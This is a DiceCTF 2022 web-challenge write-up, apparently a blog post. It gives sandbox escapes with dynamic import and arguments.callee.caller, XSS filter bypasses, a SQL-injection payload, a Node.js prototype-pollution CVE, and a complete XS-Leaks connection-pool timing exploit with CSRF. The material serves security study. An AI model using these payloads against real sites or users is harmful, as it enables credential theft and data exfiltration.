let Error=undefined;let EvalError=undefined; let Event=undefined;let EventTarget=undefined; let FinalizationRegistry=undefined; let Float32Array=undefined;let Float64Array=undefined; let Function=undefined;let Infinity=undefined;let Int16Array=undefined; let Int32Array=undefined;let __dirname=undefined;let Int8Array=undefined; let Intl=undefined;let JSON=undefined;let Map=undefined; let Math=undefined;let MessageChannel=undefined;let MessageEvent=undefined; let MessagePort=undefined;let NaN=undefined;let Number=undefined; let Object=undefined;let Promise=undefined;let Proxy=undefined; let RangeError=undefined;let ReferenceError=undefined;let Reflect=undefined; let RegExp=undefined;let Set=undefined;let SharedArrayBuffer=undefined; let String=undefined;let Symbol=undefined;let SyntaxError=undefined; let TextDecoder=undefined;let TextEncoder=undefined;let TypeError=undefined; let URIError=undefined;let URL=undefined;let URLSearchParams=undefined; let Uint16Array=undefined;let Uint32Array=undefined;let Uint8Array=undefined; let Uint8ClampedArray=undefined;let WeakMap=undefined;let WeakRef=undefined; let WeakSet=undefined;let WebAssembly=undefined;let _=undefined; let exports=undefined;let _error=undefined;let assert=undefined; let async_hooks=undefined;let atob=undefined;let btoa=undefined; let buffer=undefined;let child_process=undefined;let clearImmediate=undefined; let clearInterval=undefined;let clearTimeout=undefined;let cluster=undefined; let constants=undefined;let crypto=undefined;let decodeURI=undefined; let decodeURIComponent=undefined;let dgram=undefined; let diagnostics_channel=undefined;let dns=undefined;let domain=undefined; let encodeURI=undefined;let encodeURIComponent=undefined; let arguments=undefined;let escape=undefined;let events=undefined; let fs=undefined;let global=undefined;let globalThis=undefined; let http=undefined;let http2=undefined;let https=undefined; let inspector=undefined;let isFinite=undefined;let isNaN=undefined; let module=undefined;let net=undefined;let os=undefined;let parseFloat=undefined; let parseInt=undefined;let path=undefined;let perf_hooks=undefined; let performance=undefined;let process=undefined;let punycode=undefined; let querystring=undefined;let queueMicrotask=undefined;let readline=undefined; let repl=undefined;let require=undefined;let setImmediate=undefined; let setInterval=undefined;let __filename=undefined;let setTimeout=undefined; let stream=undefined;let string_decoder=undefined;let structuredClone=undefined; let sys=undefined;let timers=undefined;let tls=undefined; let trace_events=undefined;let tty=undefined;let unescape=undefined; let url=undefined;let util=undefined;let v8=undefined;let vm=undefined; let wasi=undefined;let worker_threads=undefined;let zlib=undefined; let __proto__=undefined;let hasOwnProperty=undefined;let isPrototypeOf=undefined; let propertyIsEnumerable=undefined;let toLocaleString=undefined; let toString=undefined;let valueOf=undefined; console.log(eval(input)); &#125; You can execute any code, but what can you do when almost everything becomes undefined? When I was looking at this challenge, I didn’t know what to do. I tried several things that are supposed to be default, such as module and exports, but they all returned undefined. I thought about trying import, but it threw an error: SyntaxError: Cannot use import statement outside a module. According to the author’s writeup, there are two solutions to this challenge. The first solution is that although import &quot;fs&quot; doesn’t work, import(&#39;fs&#39;) does. I looked at MDN, which says: “There is also a function-like dynamic import(), which does not require scripts of type&#x3D;”module”.” So you can solve it like this: import(\"fs\").then(m=>console.log(m.readFileSync(\"/flag.txt\", \"utf8\"))) The other solution is to know some details about Node.js, such as if you write this code: console.log(\"Trying to reach\"); return; console.log(\"dead code\"); Because there is no function, you expect the return to fail, but when you run it, you will find that it doesn’t fail and it really looks like a function. This is because Node.js modules are actually put into a function. The above code looks like this: (function (exports, require, module, __filename, __dirname) &#123; console.log(\"Trying to reach\"); return; console.log(\"dead code\"); &#125;); Our goal is to get the require parameter, but because arguments is also undefined, we cannot get it directly. We need to get it indirectly. What does this mean? We can first execute a function, and then use arguments.callee.caller.arguments to get the parameters of the parent function, like this: function wrapper(flag) &#123; &#123; let flag = null let arguments = null function inner() &#123; console.log(arguments.callee === inner) // true console.log(arguments.callee.caller === wrapper) // true console.log(arguments.callee.caller.arguments[0]) // I am flag &#125; inner() &#125; &#125; wrapper('I am flag') There are two regrets I have about this question. One is that a student asked me about the return issue before, and I only said that there was an outer layer of function, but I didn’t remember it. As a result, I completely forgot about it. The second one is the arguments.callee.caller operation, which I wrote about two years ago: I’m weird for thinking JavaScript function is awesome. Supplement on 2022-02-09: Here is another cool solution from DiceCTF 2022 WriteUps by maple3142. Here, the feature of structuredStackTrace in Node.js is used, and a simple POC looks like this: function CustomError() &#123; const oldStackTrace = Error.prepareStackTrace try &#123; Error.prepareStackTrace = (err, structuredStackTrace) => structuredStackTrace Error.captureStackTrace(this) this.stack &#125; finally &#123; Error.prepareStackTrace = oldStackTrace &#125; &#125; function trigger() &#123; const err = new CustomError() for (const x of err.stack) &#123; console.log(x.getFunction()+\"\") &#125; &#125; trigger() We can use x.getFunction() to get the upper function, which is the one that Node.js adds a wrapper to, and then use arugments to get the parameters. The official documentation talks about the Stack trace API. And there’s one more thing I think is cool. In the POC above, if we put it in the undefined question, we don’t have an Error to use, so what do we do? The author of the writeup used this trick: try &#123; null.f() &#125; catch (e) &#123; TypeError = e.constructor &#125; Error = TypeError.prototype.__proto__.constructor That’s right! Since we can’t get the Error, let’s create a TypeError first, and then use the fact that TypeError inherits from Error to get the Error constructor without relying on global. This trick is so cool. web&#x2F;blazingfast(75 solves)The description of this question is: I made a blazing fast MoCkInG CaSe converter! In short, a converter that converts odd-positioned letters to uppercase was written, and the main code is as follows: let blazingfast = null; function mock(str) &#123; blazingfast.init(str.length); if (str.length >= 1000) return 'Too long!'; for (let c of str.toUpperCase()) &#123; if (c.charCodeAt(0) > 128) return 'Nice try.'; blazingfast.write(c.charCodeAt(0)); &#125; if (blazingfast.mock() == 1) &#123; return 'No XSS for you!'; &#125; else &#123; let mocking = '', buf = blazingfast.read(); while(buf != 0) &#123; mocking += String.fromCharCode(buf); buf = blazingfast.read(); &#125; return mocking; &#125; &#125; function demo(str) &#123; document.getElementById('result').innerHTML = mock(str); &#125; WebAssembly.instantiateStreaming(fetch('/blazingfast.wasm')).then((&#123; instance &#125;) => &#123; blazingfast = instance.exports; document.getElementById('demo-submit').onclick = () => &#123; demo(document.getElementById('demo').value); &#125; let query = new URLSearchParams(window.location.search).get('demo'); if (query) &#123; document.getElementById('demo').value = query; demo(query); &#125; &#125;) The blazingfast.c code is as follows: int length, ptr = 0; char buf[1000]; void init(int size) &#123; length = size; ptr = 0; &#125; char read() &#123; return buf[ptr++]; &#125; void write(char c) &#123; buf[ptr++] = c; &#125; int mock() &#123; for (int i = 0; i &lt; length; i ++) &#123; if (i % 2 == 1 &amp;&amp; buf[i] >= 65 &amp;&amp; buf[i] &lt;= 90) &#123; buf[i] += 32; &#125; if (buf[i] == '&lt;' || buf[i] == '>' || buf[i] == '&amp;' || buf[i] == '\"') &#123; return 1; &#125; &#125; ptr = 0; return 0; &#125; As long as the content in buf contains &lt; and &gt;, it will directly return 1, and then the JS layer will return No XSS for you!, so it is not easy to execute XSS. I found the key to this question, but I didn’t read the code carefully at the time, which led to a wrong idea, and unfortunately I didn’t solve it. The key is to use some special characters to create length differences, such as the ß character, which has a length of 1, but becomes two words after being converted to uppercase: 'ß'.length // 1 'ß'.toUpperCase().length // 2, becomes SS There are other characters with this feature, and you can fuzz them yourself. Some characters are useful for bypassing length restrictions, such as this article: Exploiting XSS with 20 characters limitation, which uses this trick to shorten the length. URLs can also use the same trick, as can be seen in domain-obfuscator or Unicode Mapping on Domain names. Assuming I have a string ßßßßßßßß&lt;b&gt;1&lt;/b&gt;, the length is 16, so the length will be 16 when initialized, but when it runs to the loop, it will become 8*2+8 &#x3D; 24 words because it is converted to uppercase, so all 24 words will be written into buf. In the mock function, only the things in the length will be checked, so the last 8 words will not be checked, and &lt;&gt; and other characters can be smuggled in, like this: But because all characters will be converted to uppercase, we need to find an XSS payload that can still be used after being converted to uppercase. At this time, we can use an encoded string, like this: &lt;img src&#x3D;x onerror&#x3D;&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;(1)&quot; &#x2F;&gt; web&#x2F;no-cookies(5 solves)This question is quite interesting. The description is: I found a more secure way to authenticate users. No cookies, no problems! In short, there is a website that asks for your username and password for any operation, and the API will directly bring the username and password, so there is no need for cookies. The front-end code for this question is as follows: (() => &#123; const validate = (text) => &#123; return /^[^$']+$/.test(text ?? ''); &#125; const promptValid = (text) => &#123; let result = prompt(text) ?? ''; return validate(result) ? result : promptValid(text); &#125; const username = promptValid('Username:'); const password = promptValid('Password:'); const params = new URLSearchParams(window.location.search); (async () => &#123; const &#123; note, mode, views &#125; = await (await fetch('/view', &#123; method: 'POST', headers: &#123; 'Content-Type': 'application/json', &#125;, body: JSON.stringify(&#123; username, password, id: params.get('id') &#125;) &#125;)).json(); if (!note) &#123; alert('Invalid username, password, or note id'); window.location = '/'; return; &#125; let text = note; if (mode === 'markdown') &#123; text = text.replace(/\\[([^\\]]+)\\]\\(([^\\)]+)\\)/g, (match, p1, p2) => &#123; return `&lt;a href=\"$&#123;p2&#125;\">$&#123;p1&#125;&lt;/a>`; &#125;); text = text.replace(/#\\s*([^\\n]+)/g, (match, p1) => &#123; return `&lt;h1>$&#123;p1&#125;&lt;/h1>`; &#125;); text = text.replace(/\\*\\*([^\\n]+)\\*\\*/g, (match, p1) => &#123; return `&lt;strong>$&#123;p1&#125;&lt;/strong>`; &#125;); text = text.replace(/\\*([^\\n]+)\\*/g, (match, p1) => &#123; return `&lt;em>$&#123;p1&#125;&lt;/em>`; &#125;); &#125; document.querySelector('.note').innerHTML = text; document.querySelector('.views').innerText = views; &#125;)(); &#125;)(); The part that parses Markdown looks like it can be XSS: text = text.replace(/\\[([^\\]]+)\\]\\(([^\\)]+)\\)/g, (match, p1, p2) => &#123; return `&lt;a href=\"$&#123;p2&#125;\">$&#123;p1&#125;&lt;/a>`; &#125;); Afterwards, the author said that he didn’t intend to leave a loophole here, but GitHub copilot wrote it out XD, but he thought it was interesting and left it. This XSS loophole is not difficult to find: var text = '[abc](123\" onfocus=alert`1` autofocus=\")' text = text.replace(/\\[([^\\]]+)\\]\\(([^\\)]+)\\)/g, (match, p1, p2) => &#123; return `&lt;a href=\"$&#123;p2&#125;\">$&#123;p1&#125;&lt;/a>`; &#125;); console.log(text) // &lt;a href=\"123\" onfocus=alert`1` autofocus=\"\">abc&lt;/a> But the problem is, once you have XSS, how do you steal the password (which is the flag for this question)? At the time, I couldn’t figure out how to steal the password, but after the competition, I saw the writeup and learned about a magical attribute: RegExp.input. This attribute can get the last input of the RegExp, for example: /a/.test('secret password') console.log(RegExp.input) // secret password And the password is the last input that was thrown into /^[^$&#39;]+$/.test(), so you can get the password through this. This is really mind-blowing. But there is a detail here. If you use Markdown XSS, the regexp that is finally matched is not the password, so you can’t get it. At this point, you must find the server’s SQL injection. The code is as follows: const db = &#123; prepare: (query, params) => &#123; if (params) for (const [key, value] of Object.entries(params)) &#123; const clean = value.replace(/['$]/g, ''); query = query.replaceAll(`:$&#123;key&#125;`, `'$&#123;clean&#125;'`); &#125; return query; &#125;, get: (query, params) => &#123; const prepared = db.prepare(query, params); try &#123; return database.prepare(prepared).get(); &#125; catch &#123;&#125; &#125;, run: (query, params) => &#123; const prepared = db.prepare(query, params); try &#123; return database.prepare(prepared).run(); &#125; catch &#123;&#125; &#125;, &#125;; const id = crypto.randomBytes(16).toString('hex'); db.run('INSERT INTO notes VALUES (:id, :username, :note, :mode, 0)', &#123; id, username, note: note.replace(/[&lt;>]/g, ''), mode, &#125;); It removes all single quotes and $, and then replaces all :param. You can use this feature to inject, for example (from DrBrix): &quot;username&quot;: &quot;a :note&quot;, &quot;password&quot;: &quot;pass&quot; &quot;note&quot;: &quot;, :mode, 0, 0) -- &quot;, &quot;mode&quot;: &quot;actual note and xss&quot; Let’s see what it looks like in the end: // 一開始是 INSERT INTO notes VALUES (:id, :username, :note, :mode, 0) // 接著假設 id 是 123，就會變成 INSERT INTO notes VALUES ('123' :username, :note, :mode, 0) // 再來 replace username，變成 INSERT INTO notes VALUES ('123', 'a :note', :note, :mode, 0) // 再來是 note，要注意的是兩個 note 都會被 replace INSERT INTO notes VALUES ('123', 'a ', :mode, 0, 0) -- '', ', :mode, 0, 0) -- ', :mode, 0) // 最後是 mode，這時候我們已經可以控制 note 內容的值了，沒有任何限制 INSERT INTO notes VALUES ('123', 'a ', 'payload', 0, 0) -- '', ', 'payload', 0, 0) -- ', :mode, 0) Using this loophole, you can do XSS without relying on Markdown, and then use the magical attribute RegExp.input to get the password. Unexpected solutionThe unexpected solution for this question is also super cool. You don’t need RegExp.input anymore. The feature used is this piece of code: document.querySelector('.note').innerHTML = text; document.querySelector('.views').innerText = views; You might expect that after inserting HTML, it will continue to execute and then execute the content inside the HTML, for example: &lt;div id=x>&lt;/div> &lt;div id=y>hello&lt;/div> &lt;script> x.innerHTML = '&lt;img src=x onerror=alert(window.y.innerText)>' y.innerText = 'updated' &lt;/script> The displayed alert will be updated. The event of the img is indeed executed later, but if it is written like this, it will be different: &lt;div id=x>&lt;/div> &lt;div id=y>hello&lt;/div> &lt;script> x.innerHTML = '&lt;svg>&lt;svg onload=alert(window.y.innerText)>' y.innerText = 'updated' &lt;/script> If written like this, the content in onload will be executed before y.innerText = &#39;updated&#39;, so the content of the alert will be hello. This payload is also recorded in tinyXSS: &lt;!-- In chrome, also works inside innerHTML, even on elements not yet inserted into DOM --> &lt;svg>&lt;svg/onload=eval(name)> So what can we do with this knowledge? Let’s first organize the code that loads the notes. After simplification, it looks like this: (async () => &#123; const &#123; note, mode, views &#125; = await (await fetch('/view', &#123; method: 'POST', headers: &#123; 'Content-Type': 'application/json', &#125;, body: JSON.stringify(&#123; username, password, id: params.get('id') &#125;) &#125;)).json(); document.querySelector('.note').innerHTML = text; // 在底下這行執行之前，會先執行我們的 XSS payload document.querySelector('.views').innerText = views; &#125;)(); Now, if we can execute the code before the last line, we can do some interesting things. We can first overwrite document.querySelector, and then overwrite JSON.stringify, like this: document.querySelector = function() &#123; JSON.stringify = function(data) &#123; &#125; &#125; After overriding, what can we do? After overriding, we can use arguments.callee.caller to access the outermost anonymous async function and then call it again! After calling it again, another request will be sent, and we can intercept the password by using JSON.stringify: document.querySelector = function() &#123; JSON.stringify = function(data) &#123; console.log(data.password) // flag &#125;; arguments.callee.caller() &#125; This unexpected solution comes from @dr_brix, which is really cool. I never thought it could be done this way. web&#x2F;vm-calc(2 solves)Adding a calculation function is a common type of problem in CTF. At first glance, it seems to be a VM escape, and the core code is as follows: const &#123; NodeVM &#125; = require('vm2'); const vm = new NodeVM(&#123; eval: false, wasm: false, wrapper: 'none', strict: true &#125;); app.post(\"/\", (req, res) => &#123; const &#123; calc &#125; = req.body; if(!calc) &#123; return res.render(\"index\"); &#125; let result; try &#123; result = vm.run(`return $&#123;calc&#125;`); &#125; catch(err) &#123; console.log(err); return res.render(\"index\", &#123; result: \"There was an error running your calculation!\"&#125;); &#125; if(typeof result !== \"number\") &#123; return res.render(\"index\", &#123; result: \"Nice try...\"&#125;); &#125; res.render(\"index\", &#123; result &#125;); &#125;); The code that can get the flag is this: app.post(\"/admin\", async (req, res) => &#123; let &#123; user, pass &#125; = req.body; if(!user || !pass || typeof user !== \"string\" || typeof pass !== \"string\") &#123; return res.render(\"admin\", &#123; error: \"Missing username or password!\" &#125;); &#125; let hash = sha256(pass); if(users.filter(u => u.user === user &amp;&amp; u.pass === hash)[0] !== undefined) &#123; res.render(\"admin\", &#123; flag: await fsp.readFile(\"flag.txt\") &#125;); &#125; else &#123; res.render(\"admin\", &#123; error: \"Incorrect username or password!\" &#125;); &#125; &#125;); Regarding VM escape, all I know is based on this file: https://gist.github.com/jcreedcmu/4f6e6d4a649405a9c86bb076905696af There are some interesting ways in it, such as this: //////// // Also, the vm code could throw an exception, with proxies on it. const code5 = `throw new Proxy(&#123;&#125;, &#123; get: function(me, key) &#123; const cc = arguments.callee.caller; if (cc != null) &#123; (cc.constructor.constructor('console.log(sauce)'))(); &#125; return me[key]; &#125; &#125;)`; try &#123; vm.runInContext(code5, vm.createContext(Object.create(null))); &#125; catch(e) &#123; // The following prints out 'laser' twice, (as side-effects of e // being converted to a string) followed by &#123;&#125;, which is the effect // of the console.log actually *on* this line printing out the // stringified value of the exception, which is in this case a // (proxy-wrapped) empty object. console.log(e); &#125; Throw a proxy out as an exception, and when someone executes toString on this exception, it will trigger and we can get the external function through arguments.callee.caller. However, this problem is not about finding a vm2 0 day, but about using a Node.js 1 day to bypass this: if(users.filter(u => u.user === user &amp;&amp; u.pass === hash)[0] !== undefined) &#123; res.render(\"admin\", &#123; flag: await fsp.readFile(\"flag.txt\") &#125;); &#125; I think this bypass is also very powerful. Normally, users.filter will return an empty array because no conditions are met, so the length is usually checked. Here, however, the first element of the array is checked to see if it is undefined. This is because if there is a prototype pollution vulnerability, we can pollute the first property of the array, and [][0] will have something, which will make the if statement true. And this vulnerability is numbered CVE-2022-21824, and the way to use it is: console.table([&#123;x:1&#125;], [\"__proto__\"]); The first parameter of this API is the data, and the second parameter is the field to be displayed, like this: The fixed commit is this one: https://github.com/nodejs/node/commit/3454e797137b1706b11ff2f6f7fb60263b39396b From this, we can see that the problem is with the map object. Let’s take a closer look at the key part of the console.table code: lib&#x2F;internal&#x2F;console&#x2F;constructor.js // tabularData 是第一個參數 [&#123;x:1&#125;] // properties 是第二個參數 [\"__proto__\"] const map = ObjectCreate(null); let hasPrimitives = false; const valuesKeyArray = []; const indexKeyArray = ObjectKeys(tabularData); for (; i &lt; indexKeyArray.length; i++) &#123; const item = tabularData[indexKeyArray[i]]; const primitive = item === null || (typeof item !== 'function' &amp;&amp; typeof item !== 'object'); if (properties === undefined &amp;&amp; primitive) &#123; hasPrimitives = true; valuesKeyArray[i] = _inspect(item); &#125; else &#123; const keys = properties || ObjectKeys(item); // for of 的時候 key 會是 __proto__ for (const key of keys) &#123; if (map[key] === undefined) map[key] = []; // !ObjectPrototypeHasOwnProperty(item, key) 會成立 if ((primitive &amp;&amp; properties) || !ObjectPrototypeHasOwnProperty(item, key)) // 因此 map[__proto__][0] 會是空字串 map[key][i] = ''; else map[key][i] = _inspect(item[key]); &#125; &#125; &#125; So through this method, we can pollute Object.prototype[0] and make it an empty string. It seems that we should follow Node.js security updates, and there are many useful information. web&#x2F;noteKeeper(2 solves)I didn’t look at this problem carefully at the time, so I put it aside for future study: https://brycec.me/posts/dicectf_2022_writeups#notekeeper web&#x2F;dicevault(2 solves)I didn’t look at this problem carefully either, I only knew it was a tribute to another problem: http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html Author’s answer: https://hackmd.io/fmdfFQ2iS6yoVpbR3KCiqQ#webdicevault web&#x2F;carrot(1 solves)This is also an interesting question, a very simple service that allows you to add notes and search, as shown below: When searching, it will search the content and display it if it exists. The backend code is as follows: @app.route('/tasks') def tasks(): if 'username' not in session: return redirect('/') tasks = db.get(session['username'])['tasks'] if 'search' in request.args: search = request.args['search'] tasks = list(filter(lambda task: search in task['content'], tasks)) tasks = list(sorted(tasks, key=lambda task: -task['priority'])) return render_template('tasks.html', tasks=tasks) The flag is hidden in the admin note and will be automatically created when started: if not has('admin'): password = config.ADMIN_PASSWORD put('admin', &#123; 'tasks': [&#123; 'title': 'flag', 'content': os.getenv('FLAG', default='dice&#123;flag&#125;'), 'priority': 1, 'id': 0 &#125;], 'password': bcrypt.hashpw(password.encode(), bcrypt.gensalt()).decode('utf-8') &#125;) From the behavior of the admin bot and other observations, it seems to be an XS-Leaks problem. As long as you can observe whether the search result has a flag, it is enough, but the difficulty lies in not being able to figure out how to observe. The official did not release this question and it seems that the answer will not be released (since it is not released, it may be a Chrome 0 day or an unrepaired bug?), but someone provided an XS-Leaks exploit after the game: https://gist.github.com/kunte0/47c2b53535605d842f984e77d6c63eed Complete code: &lt;h1>DiceCTF 2022 web/carrot&lt;/h1> &lt;p>Step 1: CSRF the admin user, to set a super long title for the flag note (LAX + POST form only possible for 2 minutes after cookies is created)&lt;/p> &lt;button onclick=\"csrf()\">do csrf&lt;/button> &lt;p>Step 2: XS-Search with &lt;a href=\"https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/\">connection-pool timing leak&lt;/a>, we have to use window.open (LAX cookie)&lt;/p> &lt;button onclick=\"popunder()\">open popup&lt;/button> &lt;button onclick=\"exhaust_sockets()\">open 255 connections&lt;/button> &lt;button onclick=\"oracle('dice&#123;abc')\">test search \"abc\" (slow)&lt;/button> &lt;button onclick=\"oracle('dice&#123;xxx')\">test search \"xxx\" (fast)&lt;/button> &lt;br> &lt;br> &lt;h2 id=output>&lt;/h2> &lt;br> &lt;form id=x action=\"\" method=\"POST\" style=\"display:none;\"> &lt;input type=\"text\" name=\"title\" placeholder=\"title\"> &lt;br>&lt;br> &lt;input type=\"number\" name=\"priority\" placeholder=\"priority\" value=9999> &lt;br>&lt;br> &lt;textarea name=\"content\" placeholder=\"content\" rows=\"5\" cols=\"20\">&lt;/textarea> &lt;br>&lt;br> &lt;input type=\"submit\" value=\"submit\"> &lt;/form> &lt;script> // this is send is used as logging LOG = 'Starting' // 255 in normal chrome, 99 in headless SOCKETLIMIT = 255; // default TIMELIMIT = 800; INSTANCE = '' MYSERVER = `example.com` const sleep = (ms) => &#123; return new Promise(resolve => &#123; setTimeout(resolve, ms); &#125;); &#125; const time_fetch = async() => &#123; let test_server_url = `https://$&#123;MYSERVER&#125;/?$&#123;LOG&#125;`; let start = window.performance.now(); try &#123; await fetch(test_server_url, &#123; mode: 'no-cors' &#125;); &#125; catch (e) &#123; console.log(e); &#125; let end = window.performance.now(); return end - start; &#125; const fetch_sleep_long = (i) => &#123; // 40s sleep return fetch(`https://$&#123;i&#125;.$&#123;MYSERVER&#125;/40sleep`, &#123; mode: 'no-cors' &#125;); &#125; const fetch_sleep_short = (i) => &#123; // 0.25s sleep return fetch(`https://$&#123;i&#125;.$&#123;MYSERVER&#125;/ssleep`, &#123; mode: 'no-cors' &#125;); &#125; const block_socket = async (i) => &#123; fetch_sleep_long(i); // needed? await sleep(0); &#125; const exhaust_sockets = async() => &#123; let i = 0 for (; i &lt; SOCKETLIMIT; i++) &#123; block_socket(i); &#125; console.log(`Used $&#123;i&#125; connections`); &#125; const timeit = async (url, popup) => &#123; return new Promise(async (r) => &#123; popup.location = url; // needed? await sleep(50) let val = await time_fetch() r(val) &#125;); &#125; // const alphabet = '_abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ-&#125;!\"#$%&amp;\\'()*+,-./:;&lt;=>?@[\\\\]^`|~&#123;'.split(''); const alphabet = 'abcdefghijklmnopqrstuvwxyz&#125;_'.split(''); // const alphabet = 'abcdef&#125;'.split(''); const oracle = async (search) => &#123; let url = `https://carrot-$&#123;INSTANCE&#125;.mc.ax/tasks?search=$&#123;search&#125;` let t = await timeit(url, WINBG) LOG = `$&#123;search&#125;:$&#123;t&#125;` console.log(`$&#123;search&#125;:$&#123;t&#125;`) return t > TIMELIMIT &#125; const brute = async (flag) => &#123; for (const char of alphabet) &#123; if (await oracle(flag + char)) &#123; return char; &#125; &#125; return false; &#125; const calibrate = async () => &#123; return new Promise(async (r) => &#123; // slow let url1 = `https://carrot-$&#123;INSTANCE&#125;.mc.ax/tasks?search=dice&#123;` let t1 = await timeit(url1, WINBG) console.log(`slow:$&#123;t1&#125;`) // fast let url2 = `https://carrot-$&#123;INSTANCE&#125;.mc.ax/tasks?search=XXXXXXXXXX` let t2 = await timeit(url2, WINBG) console.log(`fast:$&#123;t2&#125;`) return r((t1 + t2) / 2) &#125;); &#125; const exploit = async(flag = '') => &#123; console.log('Starting') // dont go to fast plz :) console.log(`waiting 3s`) await sleep(3000) // exaust sockets await exhaust_sockets() await sleep(2000) LOG = `Calibrating` TIMELIMIT = await calibrate() LOG = `TIMELIMIT:$&#123;TIMELIMIT&#125;` console.log(`timelimit:$&#123;TIMELIMIT&#125;`) await sleep(2000) let last; while (true) &#123; last = await brute(flag); if (last === false) &#123; return flag; &#125; else &#123; flag += last; output.innerText = flag; if(last === '&#125;')&#123; return flag &#125; &#125; &#125; &#125; const popunder = () => &#123; if (window.opener) &#123; WINBG = window.opener &#125; else &#123; WINBG = window.open(location.href, target=\"_blank\") location = `about:blank` &#125; &#125; const csrf = async () => &#123; x.action = `https://carrot-$&#123;INSTANCE&#125;.mc.ax/edit/0` x.title.value = \"A\".repeat(1000000) x.submit() &#125; window.onload = () => &#123; let p = new URL(location).searchParams; if(!p.has('i'))&#123; console.log(`no INSTANCE`) return &#125; INSTANCE = p.get('i') // step 1 if(p.has('csrf'))&#123; csrf() return &#125; // step 2 if (p.has('exploit')) &#123; // window open is ok in headless :) popunder() exploit('dice&#123;') &#125; &#125; &lt;/script> In short, you can first use CSRF to change the title of the admin note to a super long string. Because jinja2 render will slow down, the response time will increase. Then it is a timing attack. The exploit above uses connection pool. First, stuff the browser’s connection pool with only one left, and then use a new window to visit the search URL (let’s call it reqSearch). At the same time, send a request to our own server (we call it reqMeasure). Because only one connection can be used, the time from sending the request to receiving the response of reqMeasure is the time spent by reqSearch + the time spent by reqMeasure. Assuming that the time spent by reqMeasure is similar, we can easily measure the time spent by reqSearch. After measuring the time, you can slowly brute force the content of the flag. web&#x2F;shadow(0 solves)This is a pure front-end problem. Let’s take a look at the code: &lt;!DOCTYPE html> &lt;html lang=\"en\">&lt;head> &lt;meta http-equiv=\"content-type\" content=\"text/html; charset=UTF-8\"> &lt;meta charset=\"UTF-8\"> &lt;title>shadow&lt;/title> &lt;/head> &lt;body> &lt;h3 id=\"title\">store your secrets here:&lt;/h3> &lt;div id=\"vault\">&lt;/div> &lt;div id=\"xss\">&lt;/div> &lt;script> // the admin has the flag set in localStorage[\"secret\"] let secret = localStorage.getItem(\"secret\") ?? \"dice&#123;not_real_flag&#125;\" let shadow = window.vault.attachShadow(&#123; mode: \"closed\" &#125;); let div = document.createElement(\"div\"); div.innerHTML = ` &lt;p>steal me :)&lt;/p> &lt;!-- secret: $&#123;secret&#125; --> `; let params = new URL(document.location).searchParams; let x = params.get(\"x\"); let y = params.get(\"y\"); div.style = y; shadow.appendChild(div); secret = null; localStorage.removeItem(\"secret\"); shadow = null; div = null; // free XSS window.xss.innerHTML = x; &lt;/script> &lt;/body>&lt;/html> A closed shadow DOM is created, and you are asked to find a way to access the content inside. According to MDN, closed means: closed: Denies access to the node(s) of a closed shadow root from JavaScript outside it: So JavaScript cannot directly access the code, and no matter how you query, it will be null. Therefore, the key to this question is a deliberately left style injection: div.style = y;, and you can add some CSS. When doing this question, I thought that maybe using Houdini and implementing some custom CSS properties or layout rules could get the DOM, but because of CSP and execution order, it should not be possible. Later, because no one solved this question for a long time, the organizers released a hint: “Hint 1: non-standard css properties might help you.” After seeing this, I went to Google: non-standard css properties, and found this: Non-standard and Obsolete CSS Properties, and actually tried several properties in it, but they were not helpful. At this point, I suddenly became curious about which CSS properties Chrome actually supports, so I went directly to the source code to see it and found this: https://chromium.googlesource.com/chromium/blink/+/refs/heads/main/Source/core/css/CSSProperties.in I looked through the CSS properties one by one, and found -webkit-user-modify, which led me to MDN: https://developer.mozilla.org/en-US/docs/Web/CSS/user-modify It looks like this property is similar to contenteditable. Since it has become contenteditable, I naturally thought of document.execCommand, which has an insertHTML command that looks promising. So I tried various things on the console, such as document.execCommand(&#39;insertHTML&#39;,false,&#39;&lt;img src=x onerror=console.log(this.parentNode)&#39;), but the console displayed null. I thought it might not be the right solution, so I gave up. After reading the writeup: https://github.com/Super-Guesser/ctf/blob/master/2022/dicectf/shadow.md, I found that my direction was completely correct, but there were two key points that I missed. The first key point is to focus on the text first before executing insertHTML. I had tried .focus() before, but it didn’t work. The second key point is to use svg to succeed. Here is the successful payload: https:&#x2F;&#x2F;aszx87410.github.io&#x2F;demo&#x2F;misc&#x2F;shadow.html?y&#x3D;-webkit-user-modify:+read-write&amp;x&#x3D;&lt;img+src&#x3D;x+onerror&#x3D;&quot;find(&#39;steal me&#39;);document.execCommand(&#39;insertHTML&#39;,false,&#39;&lt;svg&#x2F;onload&#x3D;alert(this.parentNode.innerHTML)&gt;&#39;)&quot;&gt; First, use window.find to focus on the content, then execute document.execCommand to insert HTML, and then use the svg event to execute JS to get the node. Here are some payloads that will fail: &#x2F;&#x2F; 沒有 focus https:&#x2F;&#x2F;aszx87410.github.io&#x2F;demo&#x2F;misc&#x2F;shadow.html?y&#x3D;-webkit-user-modify:+read-write&amp;x&#x3D;&lt;img+src&#x3D;x+onerror&#x3D;&quot;document.execCommand(&#39;insertHTML&#39;,false,&#39;&lt;svg&#x2F;onload&#x3D;alert(this.parentNode.innerHTML)&gt;&#39;)&quot;&gt; &#x2F;&#x2F; 用了不是 svg 的元素，會讀不到 this.parentNode https:&#x2F;&#x2F;aszx87410.github.io&#x2F;demo&#x2F;misc&#x2F;shadow.html?y&#x3D;-webkit-user-modify:+read-write&amp;x&#x3D;&lt;img+src&#x3D;x+onerror&#x3D;&quot;find(&#39;steal me&#39;);document.execCommand(&#39;insertHTML&#39;,false,&#39;&lt;img&#x2F;src&#x3D;x+onerror&#x3D;alert(this.parentNode.innerHTML)&gt;&#39;)&quot;&gt; But the magical thing is that if you first add document.exec(&#39;selectAll&#39;) at the beginning, it works: https:&#x2F;&#x2F;aszx87410.github.io&#x2F;demo&#x2F;misc&#x2F;shadow.html?y&#x3D;-webkit-user-modify:+read-write&amp;x&#x3D;&lt;img+src&#x3D;x+onerror&#x3D;&quot;find(&#39;steal me&#39;);document.execCommand(&#39;selectAll&#39;);document.execCommand(&#39;insertHTML&#39;,false,&#39;&lt;img&#x2F;src&#x3D;x+onerror&#x3D;alert(this.parentNode.parentNode.innerHTML)&gt;&#39;)&quot;&gt; Why is there this difference? I don’t know, and the people who solved it don’t seem to know either XD In addition to learning about the magical API window.find, I also learned about another hidden API from the post-event discussion on Discord: document.execCommand(&#39;findString&#39;, false, &#39;steal&#39;), which they said they saw in the Chromium source code: 